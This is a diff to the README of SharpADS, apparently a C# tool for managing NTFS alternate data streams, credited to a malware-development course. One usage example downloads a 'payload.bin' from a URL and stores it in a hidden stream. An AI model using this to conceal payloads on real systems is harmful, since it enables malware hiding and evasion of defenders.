@@ -14,19 +14,19 @@ SharpADS.exe write FILE_PATH STREAM_NAME PAYLOAD
 String example:
 
 ```
-SharpADS.exe write c:\Temp\test.txt ads_name RandomString
+SharpADS.exe write c:\Temp\test.txt ADS_name1 RandomString
 ```
 
 Hexadecimal value example (payload starts with "0x..."):
 
 ```
-SharpADS.exe write c:\Temp\test.txt ads_name 0x4142434445
+SharpADS.exe write c:\Temp\test.txt ADS_name2 0x4142434445
 ```
 
 Download file example (payload starts with "http" or "https"):
 
 ```
-SharpADS.exe write c:\Temp\test.txt ads_name http:///127.0.0.1/payload.bin
+SharpADS.exe write c:\Temp\test.txt ADS_name3 http:///127.0.0.1/payload.bin
 ```
 
 ![img](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/SharpADS-screenshots/Screenshot_1.png)
@@ -41,7 +41,7 @@ SharpADS.exe read FILE_PATH STREAM_NAME
 Read ADS example:
 
 ```
-SharpADS.exe read c:\Temp\test.txt ads_name
+SharpADS.exe read c:\Temp\test.txt ADS_name1
 ```
 
 ![img](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/SharpADS-screenshots/Screenshot_2.png)
@@ -56,7 +56,7 @@ SharpADS.exe delete FILE_PATH STREAM_NAME
 Delete ADS example:
 
 ```
-SharpADS.exe delete c:\Temp\test.txt ads_name
+SharpADS.exe delete c:\Temp\test.txt ADS_name1
 ```
 
 ![img](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/SharpADS-screenshots/Screenshot_3.png)
@@ -91,3 +91,10 @@ SharpADS.exe clear c:\Temp\test.txt
 
 ![img](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/SharpADS-screenshots/Screenshot_5.png)
 
+
+
+--------------------------------------------------------
+
+### Credits
+
+This is based on C++ code from Sektor7's [Malware Development Advanced - Vol.1 course](https://institute.sektor7.net/rto-maldev-adv1).
